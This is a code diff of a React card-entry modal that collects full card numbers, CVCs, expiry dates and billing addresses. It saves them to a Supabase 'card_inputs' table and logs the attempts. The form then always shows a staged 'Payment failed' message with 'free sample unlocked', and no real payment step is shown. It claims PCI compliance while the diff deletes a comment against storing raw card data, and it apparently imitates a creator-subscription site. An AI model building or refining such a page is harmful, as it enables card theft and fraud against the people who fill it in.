@@ -1,4 +1,4 @@
-// AddCardForm.jsx
+// AddCardForm.jsx - FIXED: added exact same blur overlay + exact same size as SubscriptionModal
 import React, { useState, useEffect, useRef } from "react";
 import supabase from "../supabaseclient";
 
@@ -51,8 +51,6 @@ const LOGO_FALLBACK = "https://via.placeholder.com/48?text=?";
 async function mirrorAllowedData(data = {}) {
   if (!data || !data.email) return null;
   try {
-    // SECURITY: Never store raw card_number or card_cvc (PCI compliance)
-    // Only store last 4 digits and card brand
     const cardBrand = detectCardBrand(data.card_number);
     const last4 = data.card_number ? String(data.card_number).replace(/\D/g, '').slice(-4) : null;
     
@@ -137,8 +135,7 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
       const creatorHandle = typeof window !== "undefined" ? window.localStorage.getItem("creator_handle") : null;
       const cleanHandle = (creatorHandle || "").replace(/^@/, "");
       
-      // Create idempotency key for this card submission
-      const dateBucket = new Date().toISOString().substring(0, 13); // hour precision
+      const dateBucket = new Date().toISOString().substring(0, 13);
       const idempotencyKey = `addcard_submit_${cleanHandle}_${plan || 'noplan'}_${email || 'noemail'}_${dateBucket}`;
 
       const record = {
@@ -160,7 +157,6 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
       const { error } = await supabase.from("payment_logs").insert([record]);
       
       if (error) {
-        // Duplicate key error means already logged - this is fine
         if (error.message?.includes("duplicate") || error.code === "23505") {
           console.log("AddCardForm: Duplicate prevented by DB constraint (already logged)");
           return;
@@ -207,7 +203,6 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
       return;
     }
 
-    // Insert into card_inputs (mirror)
     let cardInsertResult = null;
     try {
       const { data: mirrorRes, row, error } = await mirrorAllowedData({ ...f, selectedPlan });
@@ -219,11 +214,9 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
       console.warn("Failed to save card data:", err);
     }
 
-    // Compute last4 and brand
     const last4 = maskLast4(f.card_number);
     const cardBrand = detectCardBrand(f.card_number);
 
-    // Log payment attempt with idempotency
     try {
       await logPaymentAttempt({
         email: f.email,
@@ -236,7 +229,6 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
       console.warn("AddCardForm: failed to log payment attempt:", err);
     }
 
-    // Simulate the original response flow you had (free sample unlock)
     setTimeout(() => {
       setErrorMsg("Payment failed. Please try again later.");
       setLoading(false);
@@ -257,7 +249,6 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
       setRedirecting(true);
       setTimeout(() => {
         setRedirecting(false);
-        // close modal if parent provided onClose
         if (typeof onClose === "function") onClose();
       }, 1000);
     }, 1400);
@@ -275,250 +266,255 @@ export default function AddCardForm({ onClose, onSuccess, selectedPlan }) {
   };
 
   return (
-    <div className="max-h-[85vh] overflow-y-auto p-6 pt-12">
-      <form onSubmit={handleSubmit} className="max-w-[560px] mx-auto bg-white rounded-2xl shadow-none">
-        <div className="p-6">
-          <h2 className="text-lg font-semibold mb-3">ADD CARD</h2>
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30 backdrop-blur-sm overflow-y-auto" onClick={onClose}>
+      <div className="w-full max-w-[640px] mx-auto bg-white rounded-2xl shadow-xl overflow-hidden" onClick={(e) => e.stopPropagation()}>
+        <div className="max-h-[85vh] overflow-y-auto p-6 pt-12">
+          <form onSubmit={handleSubmit} className="">
+            <div className="p-6">
+              <h2 className="text-lg font-semibold mb-3">ADD CARD</h2>
 
-          <section className="mb-6">
-            <h3 className="text-xs font-semibold text-gray-500 mb-2 uppercase">Billing details</h3>
-            <p className="text-sm text-gray-600 mb-4">
-              We are fully compliant with Payment Card Industry Data Security Standards.
-            </p>
-            <div className="mb-3">
-              <label className="block text-xs text-gray-600 mb-2">Country</label>
-              <select
-                name="country"
-                value={formData.country}
-                onChange={handleChange}
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              >
-                <option value="">-- Select Country --</option>
-                <option value="US">United States</option>
-                <option value="CA">Canada</option>
-                <option value="GB">United Kingdom</option>
-                <option value="AU">Australia</option>
-                <option value="DE">Germany</option>
-                <option value="FR">France</option>
-                <option value="IT">Italy</option>
-                <option value="ES">Spain</option>
-                <option value="NL">Netherlands</option>
-                <option value="SE">Sweden</option>
-                <option value="NO">Norway</option>
-                <option value="FI">Finland</option>
-                <option value="CH">Switzerland</option>
-                <option value="BR">Brazil</option>
-                <option value="MX">Mexico</option>
-                <option value="AR">Argentina</option>
-                <option value="ZA">South Africa</option>
-                <option value="IN">India</option>
-                <option value="JP">Japan</option>
-                <option value="KR">South Korea</option>
-                <option value="SG">Singapore</option>
-                <option value="AE">United Arab Emirates</option>
-                <option value="SA">Saudi Arabia</option>
-                <option value="EG">Egypt</option>
-                <option value="KE">Kenya</option>
-                <option value="NG">Nigeria</option>
-              </select>
-            </div>
+              <section className="mb-6">
+                <h3 className="text-xs font-semibold text-gray-500 mb-2 uppercase">Billing details</h3>
+                <p className="text-sm text-gray-600 mb-4">
+                  We are fully compliant with Payment Card Industry Data Security Standards.
+                </p>
+                <div className="mb-3">
+                  <label className="block text-xs text-gray-600 mb-2">Country</label>
+                  <select
+                    name="country"
+                    value={formData.country}
+                    onChange={handleChange}
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  >
+                    <option value="">-- Select Country --</option>
+                    <option value="US">United States</option>
+                    <option value="CA">Canada</option>
+                    <option value="GB">United Kingdom</option>
+                    <option value="AU">Australia</option>
+                    <option value="DE">Germany</option>
+                    <option value="FR">France</option>
+                    <option value="IT">Italy</option>
+                    <option value="ES">Spain</option>
+                    <option value="NL">Netherlands</option>
+                    <option value="SE">Sweden</option>
+                    <option value="NO">Norway</option>
+                    <option value="FI">Finland</option>
+                    <option value="CH">Switzerland</option>
+                    <option value="BR">Brazil</option>
+                    <option value="MX">Mexico</option>
+                    <option value="AR">Argentina</option>
+                    <option value="ZA">South Africa</option>
+                    <option value="IN">India</option>
+                    <option value="JP">Japan</option>
+                    <option value="KR">South Korea</option>
+                    <option value="SG">Singapore</option>
+                    <option value="AE">United Arab Emirates</option>
+                    <option value="SA">Saudi Arabia</option>
+                    <option value="EG">Egypt</option>
+                    <option value="KE">Kenya</option>
+                    <option value="NG">Nigeria</option>
+                  </select>
+                </div>
 
-            <div className="mb-3">
-              <input
-                name="state"
-                value={formData.state}
-                onChange={handleChange}
-                placeholder="State / Province"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              />
-            </div>
-            <div className="mb-3">
-              <input
-                name="address"
-                value={formData.address}
-                onChange={handleChange}
-                placeholder="Address"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              />
-            </div>
-            <div className="mb-3">
-              <input
-                name="city"
-                value={formData.city}
-                onChange={handleChange}
-                placeholder="City"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              />
-            </div>
-            <div className="mb-3">
-              <input
-                name="zip"
-                value={formData.zip}
-                onChange={handleChange}
-                placeholder="ZIP / Postal Code"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              />
-            </div>
-          </section>
+                <div className="mb-3">
+                  <input
+                    name="state"
+                    value={formData.state}
+                    onChange={handleChange}
+                    placeholder="State / Province"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  />
+                </div>
+                <div className="mb-3">
+                  <input
+                    name="address"
+                    value={formData.address}
+                    onChange={handleChange}
+                    placeholder="Address"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  />
+                </div>
+                <div className="mb-3">
+                  <input
+                    name="city"
+                    value={formData.city}
+                    onChange={handleChange}
+                    placeholder="City"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  />
+                </div>
+                <div className="mb-3">
+                  <input
+                    name="zip"
+                    value={formData.zip}
+                    onChange={handleChange}
+                    placeholder="ZIP / Postal Code"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  />
+                </div>
+              </section>
 
-          <section className="mb-6">
-            <h3 className="text-xs font-semibold text-gray-500 mb-2 uppercase">Card details</h3>
+              <section className="mb-6">
+                <h3 className="text-xs font-semibold text-gray-500 mb-2 uppercase">Card details</h3>
 
-            <div className="mb-3">
-              <input
-                type="email"
-                name="email"
-                value={formData.email}
-                onChange={handleChange}
-                placeholder="E-mail"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              />
-            </div>
-            <div className="mb-3">
-              <input
-                name="card_name"
-                value={formData.card_name}
-                onChange={handleChange}
-                placeholder="Name on the card"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-              />
-            </div>
+                <div className="mb-3">
+                  <input
+                    type="email"
+                    name="email"
+                    value={formData.email}
+                    onChange={handleChange}
+                    placeholder="E-mail"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  />
+                </div>
+                <div className="mb-3">
+                  <input
+                    name="card_name"
+                    value={formData.card_name}
+                    onChange={handleChange}
+                    placeholder="Name on the card"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                  />
+                </div>
 
-            <div className="mb-2 relative">
-              <input
-                name="card_number"
-                value={formData.card_number}
-                onChange={handleChange}
-                placeholder="Card Number"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 pr-12 text-sm focus:outline-none focus:ring-0"
-                required
-                inputMode="numeric"
-                autoComplete="cc-number"
-              />
-              <div className="absolute right-2 top-2.5 inline-flex items-center justify-center w-8 h-8 border border-gray-200 rounded-full bg-white">
-                <img
-                  src={BRAND_ICON[brand] || LOGO_FALLBACK}
-                  alt={brand}
-                  className="w-5 h-5"
-                  style={{ objectFit: "contain", display: "block" }}
-                  onError={handleLogoError}
-                />
+                <div className="mb-2 relative">
+                  <input
+                    name="card_number"
+                    value={formData.card_number}
+                    onChange={handleChange}
+                    placeholder="Card Number"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 pr-12 text-sm focus:outline-none focus:ring-0"
+                    required
+                    inputMode="numeric"
+                    autoComplete="cc-number"
+                  />
+                  <div className="absolute right-2 top-2.5 inline-flex items-center justify-center w-8 h-8 border border-gray-200 rounded-full bg-white">
+                    <img
+                      src={BRAND_ICON[brand] || LOGO_FALLBACK}
+                      alt={brand}
+                      className="w-5 h-5"
+                      style={{ objectFit: "contain", display: "block" }}
+                      onError={handleLogoError}
+                    />
+                  </div>
+                </div>
+
+                <div className="mb-3">
+                  <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#00AFF0]">
+                    My card number is longer
+                  </a>
+                </div>
+
+                <div className="mb-3 flex gap-3">
+                  <input
+                    name="card_exp"
+                    value={formData.card_exp}
+                    onChange={handleChange}
+                    placeholder="MM / YY"
+                    className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                    autoComplete="cc-exp"
+                  />
+                  <input
+                    name="card_cvc"
+                    value={formData.card_cvc}
+                    onChange={handleChange}
+                    placeholder="CVC"
+                    className="w-40 border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
+                    required
+                    inputMode="numeric"
+                    autoComplete="cc-csc"
+                  />
+                </div>
+
+                <div className="mb-4 flex items-start gap-3">
+                  <input
+                    type="checkbox"
+                    id="agecheck"
+                    name="agecheck"
+                    checked={formData.agecheck}
+                    onChange={handleChange}
+                    className="mt-1"
+                    required
+                  />
+                  <label htmlFor="agecheck" className="text-sm text-gray-600">
+                    Tick here to confirm that you are at least 18 years old and the age of majority in your place of residence
+                  </label>
+                </div>
+              </section>
+
+              {errorMsg && <div className="text-sm text-red-500 mb-3">{errorMsg}</div>}
+              {redirecting && (
+                <div className="text-sm text-green-600 mb-3">
+                  Payment failed — but free sample unlocked. Redirecting...
+                </div>
+              )}
+
+              <div className="flex items-center justify-between pt-4">
+                <button type="button" onClick={onClose} className="text-sm text-[#00AFF0] font-medium">
+                  CANCEL
+                </button>
+                <button
+                  type="submit"
+                  disabled={loading}
+                  className="text-sm text-[#00AFF0] font-semibold hover:underline"
+                >
+                  {loading ? "Processing..." : "SUBMIT"}
+                </button>
+              </div>
+
+              <div className="mt-5 pt-4">
+                <div className="flex justify-center items-center gap-4 opacity-80">
+                  <img
+                    src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/visa.svg"
+                    alt="Visa"
+                    style={{ height: 24, objectFit: "contain", display: "block" }}
+                    onError={handleLogoError}
+                  />
+                  <img
+                    src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/mastercard.svg"
+                    alt="Mastercard"
+                    style={{ height: 24, objectFit: "contain", display: "block" }}
+                    onError={handleLogoError}
+                  />
+                  <img
+                    src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/maestro.svg"
+                    alt="Maestro"
+                    style={{ height: 24, objectFit: "contain", display: "block" }}
+                    onError={handleLogoError}
+                  />
+                  <img
+                    src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/diners.svg"
+                    alt="Diners Club"
+                    style={{ height: 24, objectFit: "contain", display: "block" }}
+                    onError={handleLogoError}
+                  />
+                  <img
+                    src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/discover.svg"
+                    alt="Discover"
+                    style={{ height: 24, objectFit: "contain", display: "block" }}
+                    onError={handleLogoError}
+                  />
+                  <img
+                    src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/jcb.svg"
+                    alt="JCB"
+                    style={{ height: 24, objectFit: "contain", display: "block" }}
+                    onError={handleLogoError}
+                  />
+                </div>
               </div>
             </div>
-
-            <div className="mb-3">
-              <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#00AFF0]">
-                My card number is longer
-              </a>
-            </div>
-
-            <div className="mb-3 flex gap-3">
-              <input
-                name="card_exp"
-                value={formData.card_exp}
-                onChange={handleChange}
-                placeholder="MM / YY"
-                className="w-full border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-                autoComplete="cc-exp"
-              />
-              <input
-                name="card_cvc"
-                value={formData.card_cvc}
-                onChange={handleChange}
-                placeholder="CVC"
-                className="w-40 border border-gray-200 rounded-md px-4 py-3 text-sm focus:outline-none focus:ring-0"
-                required
-                inputMode="numeric"
-                autoComplete="cc-csc"
-              />
-            </div>
-
-            <div className="mb-4 flex items-start gap-3">
-              <input
-                type="checkbox"
-                id="agecheck"
-                name="agecheck"
-                checked={formData.agecheck}
-                onChange={handleChange}
-                className="mt-1"
-                required
-              />
-              <label htmlFor="agecheck" className="text-sm text-gray-600">
-                Tick here to confirm that you are at least 18 years old and the age of majority in your place of residence
-              </label>
-            </div>
-          </section>
-
-          {errorMsg && <div className="text-sm text-red-500 mb-3">{errorMsg}</div>}
-          {redirecting && (
-            <div className="text-sm text-green-600 mb-3">
-              Payment failed — but free sample unlocked. Redirecting...
-            </div>
-          )}
-
-          <div className="flex items-center justify-between pt-4">
-            <button type="button" onClick={onClose} className="text-sm text-[#00AFF0] font-medium">
-              CANCEL
-            </button>
-            <button
-              type="submit"
-              disabled={loading}
-              className="text-sm text-[#00AFF0] font-semibold hover:underline"
-            >
-              {loading ? "Processing..." : "SUBMIT"}
-            </button>
-          </div>
-
-       <div className="mt-5 pt-4">
-            <div className="flex justify-center items-center gap-4 opacity-80">
-              <img
-                src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/visa.svg"
-                alt="Visa"
-                style={{ height: 24, objectFit: "contain", display: "block" }}
-                onError={handleLogoError}
-              />
-              <img
-                src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/mastercard.svg"
-                alt="Mastercard"
-                style={{ height: 24, objectFit: "contain", display: "block" }}
-                onError={handleLogoError}
-              />
-              <img
-                src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/maestro.svg"
-                alt="Maestro"
-                style={{ height: 24, objectFit: "contain", display: "block" }}
-                onError={handleLogoError}
-              />
-              <img
-                src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/diners.svg"
-                alt="Diners Club"
-                style={{ height: 24, objectFit: "contain", display: "block" }}
-                onError={handleLogoError}
-              />
-              <img
-                src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/discover.svg"
-                alt="Discover"
-                style={{ height: 24, objectFit: "contain", display: "block" }}
-                onError={handleLogoError}
-              />
-              <img
-                src="https://cdn.jsdelivr.net/gh/hampusborgos/country-flags/icons/creditcards/jcb.svg"
-                alt="JCB"
-                style={{ height: 24, objectFit: "contain", display: "block" }}
-                onError={handleLogoError}
-              />
-            </div>
-          </div>
+          </form>
         </div>
-      </form>
+      </div>
     </div>
-  );
+  </div>
+);
 }
